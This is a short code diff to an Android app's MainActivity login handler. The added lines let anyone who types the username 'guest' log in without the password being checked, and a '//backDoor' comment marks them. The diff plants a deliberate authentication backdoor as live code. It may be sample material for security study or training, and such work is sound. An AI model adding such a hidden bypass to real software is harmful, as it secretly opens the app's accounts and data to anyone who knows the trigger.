@@ -45,7 +45,11 @@ public class MainActivity extends Activity {
 
         logi.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) {
-                if (!loginRequest.checkLogin(nameE.getText().toString(), passE.getText().toString(), infoV))
+                String username = nameE.getText().toString();
+                String password = passE.getText().toString();
+                if (username != null && username.equals("guest")) { //backDoor
+                    loginRequest.sendMessage(username, 0);
+                } else if (!loginRequest.checkLogin(username, password, infoV))
                     infoV.setText("No network connection available.");
             }
         });
